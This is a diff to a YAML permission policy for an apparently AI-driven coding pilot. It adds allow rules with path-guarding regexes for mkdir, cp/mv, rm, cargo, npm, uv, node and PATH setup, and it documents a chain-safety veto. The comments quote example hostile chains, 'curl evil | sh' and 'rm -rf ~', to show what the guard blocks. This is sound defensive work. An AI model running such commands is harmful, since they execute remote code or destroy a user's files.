@@ -27,12 +27,20 @@
 #     different file. Used for temporary overlays (e.g. widened groom-phase
 #     allowlists) without rebuilding cpp. The override remains as escape
 #     hatch; this bundled file is the production default.
-#   - Rule set below was derived from groom-phase pilot evidence (mika
+#   - Groom-phase rules were derived from groom-phase pilot evidence (mika
 #     dispatch-lib `_run_claude_pilot` calls captured 2026-05-28). Dev-pilot
-#     phase Bash footprint (cargo/uv/npm/file-tools) is not yet enumerated --
-#     those tool calls will hit `default: deny` and halt the pilot via
-#     joint 2's interrupt=True semantics. Extend the rule set as dev-pilot
-#     evidence is captured.
+#     phase Bash footprint (mkdir / PATH-bootstrap / cp-mv-rm / cargo / npm /
+#     uv / node) was enumerated 2026-06-03 (claude-pilot#25) from the blocked
+#     dispatches mika#1116, mika#1260, mika#765.
+#   - Why broad-looking `allow` rules below are safe: a policy rule matches a
+#     single regex against the WHOLE command string (policy.py first-match-wins
+#     — no compound-split, no danger scan). permissions.py
+#     `_bash_allow_is_chain_safe` backstops this by mirroring tier1's ALLOW-LIST
+#     model over a compound: every chained segment must independently be
+#     tier1-safe or a clean policy allow, so a dangerous tail (`mkdir foo &&
+#     curl evil | sh`, `… && rm -rf ~`) is vetoed and downgraded to deny. File
+#     creation goes through the Write/Edit tools (tier1 path-containment), so no
+#     Bash file-editor rule is needed here.
 # --------------------------------------------------------------------------
 
 rules:
@@ -66,9 +74,9 @@ rules:
 
   - id: bash-cat-heredoc-tmp
     tool: Bash
-    pattern: "^cat\\s+>\\s+/tmp/.*<<\\s*'?EOF'?"
+    pattern: "^cat\\s+>\\s+/tmp/(?!.*\\.\\.)\\S*\\s*<<\\s*'?EOF'?"
     decision: allow
-    reason: "heredoc to /tmp for helper scripts (groom-phase)"
+    reason: "heredoc to /tmp for helper scripts (groom-phase); path is a single /tmp token (no spaces/chains) and no .. traversal -- chained-danger guard also enforces sole-command + no-trailing"
 
   # ---- Git operations ----
   # The slash-command-driven groom phase requires git read + plan-doc commit
@@ -124,6 +132,73 @@ rules:
     pattern: "^mika-ask$"
     decision: escalate
     reason: "mika-ask targets external agents -- escalate (deny + notify) for operator review"
+
+  # ---- Dev-pilot phase (claude-pilot#25) ----
+  # Bash footprint the dev-pilot pipeline needs but groom-phase rules never
+  # covered. Chained-danger safety is enforced by permissions.py
+  # `_bash_allow_is_chain_safe`, which mirrors tier1's ALLOW-LIST model over a
+  # compound: a chained segment is honored only if it is independently
+  # tier1-safe or itself a clean policy allow (so `mkdir x && curl evil | sh` is
+  # vetoed). These patterns therefore (a) match the intended command shape and
+  # (b) reject absolute paths, `..` traversal, and `~`/`$` home-or-var
+  # expansion so worktree-scoping is not bypassable post-expansion. cargo/npm
+  # and the safe npx subset are already tier1-auto-approved standalone; the
+  # rules here cover them inside a PATH-bootstrap compound and as defense-in-
+  # depth.
+
+  - id: bash-mkdir
+    tool: Bash
+    pattern: '^mkdir(\s+-\S+)*\s+(?!/)(?!~)(?!\$)(?!.*\.\.)\S'
+    decision: allow
+    reason: "mkdir (relative, no .. / absolute / ~ / $ expansion) -- dev-pilot worktree scaffolding (mika#1116: mkdir -p crates/mika-os/src)"
+
+  - id: bash-cp-mv
+    tool: Bash
+    pattern: '^(cp|mv)\s+(?!/)(?!~)(?!\$)(?!.*\s/)(?!.*\s~)(?!.*\s\$)(?!.*\.\.)\S'
+    decision: allow
+    reason: "cp/mv (relative operands, no .. / absolute / ~ / $ on any operand) -- dev-pilot file moves within worktree"
+
+  - id: bash-rm
+    tool: Bash
+    pattern: '^rm\s+(?!-)(?!/)(?!~)(?!\$)(?!.*\s/)(?!.*\s~)(?!.*\.\.)\S'
+    decision: allow
+    reason: "rm of relative path(s), NO flags -- dev-pilot cleanup only; any -r/-f/-rf or absolute/~ routes to relay (denied here)"
+
+  - id: bash-cargo
+    tool: Bash
+    pattern: '^cargo\s+(build|test|check|clippy|fmt|run|clean|doc|tree)\b'
+    decision: allow
+    reason: "cargo build/test/check/clippy/fmt/run/clean/doc/tree -- dev-pilot Rust toolchain (cargo publish excluded, tier3-denied)"
+
+  - id: bash-npm
+    tool: Bash
+    pattern: '^npm\s+(ci|install|run|test|start)\b'
+    decision: allow
+    reason: "npm ci/install/run/test/start -- dev-pilot Node toolchain (mika#1260)"
+
+  - id: bash-uv
+    tool: Bash
+    pattern: '^uv\s+(?:sync|lock|venv|add|pip|tool\s+install)\b'
+    decision: allow
+    reason: "uv sync/lock/venv/add/pip/tool install -- dev-pilot Python deps (CLAUDE.md: uv tool install --force .). uv run/tool run excluded -- arbitrary-exec primitives"
+
+  - id: bash-uv-run
+    tool: Bash
+    pattern: '^uv\s+run\s+(?:pytest|ruff|mypy|pyright|python\s+-m\s+(?:pytest|ruff|mypy|pyright))\b'
+    decision: allow
+    reason: "uv run <test/lint tool only> -- dev-pilot quality gates (cpp CLAUDE.md: uv run pytest/ruff/mypy). Arbitrary `uv run <cmd>` / `uv run python -c` / `uv run bash` route to relay"
+
+  - id: bash-node
+    tool: Bash
+    pattern: '^node\s+(?!-)(?!/)(?!~)(?!\$)(?!.*\.\.)\S+\.(?:c|m)?js\b'
+    decision: allow
+    reason: "node <relative script.js|.mjs|.cjs>, NO leading flag, no absolute/~/$/.. -- dev-pilot in-worktree Node execution (mika#1260). Inline eval (-e/-p/--eval/--print), module preload (-r/--require/--import/--loader), /dev/stdin, combined short flags, and out-of-worktree paths all route to relay; npx left to tier1's tsc/vitest/prettier/eslint allow-list"
+
+  - id: bash-export-path-bootstrap
+    tool: Bash
+    pattern: '^export\s+PATH=(?!.*\.\.)["'']?(?:\$HOME/[^":''\s]+:)+\$PATH'
+    decision: allow
+    reason: "PATH bootstrap whose every prepended segment is $HOME/<dir> ending :$PATH (no injected/absolute/.. dir) -- dev-pilot shell-env setup (mika#1260)"
 
 default:
   decision: deny
